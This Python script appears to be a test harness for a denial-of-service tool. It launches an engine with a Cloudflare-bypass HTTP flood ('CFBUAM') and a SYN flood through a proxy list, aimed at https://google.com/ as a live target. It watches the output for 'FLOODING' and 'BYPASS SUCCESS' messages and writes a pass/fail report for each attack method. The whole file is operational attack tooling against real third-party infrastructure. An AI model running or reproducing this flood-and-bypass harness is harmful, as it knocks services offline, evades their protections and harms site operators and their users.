import subprocess
import time
import sys
import os
from pathlib import Path

# Target configuration
TARGET = "https://google.com/"
DOMAIN = "example-target.com"
PORT = "443"
THREADS = "10"
DURATION = "120"
RPC = "10"
PROXY_FILE = os.path.abspath("tests/http_proxies.txt")

# Method lists
L7_METHODS = [
    "CFBUAM"
]

L4_METHODS = [
    "SYN"
]

def run_method(method, is_l7=True):
    print(f"\n{'='*60}")
    print(f" TESTING METHOD: {method}")
    print(f"{'='*60}")
    
    # Construct command
    # Usage: python start.py <method> <url/ip> <socks_type> <threads> <proxylist> <rpc> <duration> <debug>
    cmd = [
        sys.executable, "-u", "src/core/engine.py",
        method,
        TARGET if is_l7 else DOMAIN,
        "0", # SOCKS5
        THREADS,
        PROXY_FILE,
        RPC,
        DURATION,
        "1" # Debug mode on
    ]
    
    # For L7 methods, we might need extra flags if we want to test them specifically
    if method in ["BROWSER", "HYBRID", "CFBUAM"]:
        cmd.extend(["--adaptive", "true"])

    print(f"Executing: {' '.join(cmd)}")
    
    start_time = time.time()
    process = subprocess.Popen(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1,
        encoding='utf-8',
        errors='ignore'
    )
    
    output_log = []
    success_detected = False
    bypass_detected = False
    
    try:
        # Read output in real-time
        while True:
            line = process.stdout.readline()
            if not line and process.poll() is not None:
                break
            if line:
                line_str = line.strip()
                print(f"  {line_str}")
                output_log.append(line_str)
                
                # Detection logic
                if "SUCCESS" in line_str.upper() or "FLOODING" in line_str.upper():
                    success_detected = True
                if "BYPASS SUCCESS" in line_str.upper() or "TOKEN SYNCHRONIZED" in line_str.upper():
                    bypass_detected = True
                
                # Auto-stop if we see success to save time
                if success_detected and (time.time() - start_time > 15):
                    print(f"\n[+] Sufficient data collected for {method}. Terminating...")
                    break
            
            # Global timeout
            if time.time() - start_time > 240:
                print(f"\n[!] Timeout reached for {method}. Terminating...")
                break
                
    finally:
        process.terminate()
        try:
            process.wait(timeout=5)
        except:
            process.kill()
            
    return {
        "method": method,
        "success": success_detected,
        "bypass": bypass_detected,
        "log": output_log[-10:] # Keep last 10 lines
    }

def main():
    # 1. Populate proxy file if empty
    if not Path(PROXY_FILE).exists() or Path(PROXY_FILE).stat().st_size == 0:
        print("[*] Generating proxy file via auto-harvest...")
        # We'll let the first L7 method handle the harvest or run a quick start.py just for proxies
        # Actually, start.py handles auto_harvest.txt if specified.
    
    results = []
    
    print(f"Starting Comprehensive Real-World Test against {TARGET}")
    
    for m in L7_METHODS:
        results.append(run_method(m, is_l7=True))
        time.sleep(2) # Cooldown between browser spawns
        
    for m in L4_METHODS:
        results.append(run_method(m, is_l7=False))
        
    # Generate Final Report
    report_path = "conductor/real_test_report.md"
    with open(report_path, "w", encoding='utf-8') as f:
        f.write(f"# Real-World Test Report: {DOMAIN}\n\n")
        f.write(f"**Date:** {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"**Target:** {TARGET}\n\n")
        
        f.write("## Results Summary\n")
        f.write("| Method | Execution | Bypass/Sync | Status |\n")
        f.write("| --- | --- | --- | --- |\n")
        for r in results:
            exec_status = "✅" if r["success"] else "❌"
            bypass_status = "✅" if r["bypass"] else "➖"
            final = "PASSED" if r["success"] else "FAILED"
            f.write(f"| {r['method']} | {exec_status} | {bypass_status} | {final} |\n")
            
    print(f"\n[!!!] TESTING COMPLETE. Report saved to {report_path}")

if __name__ == "__main__":
    main()
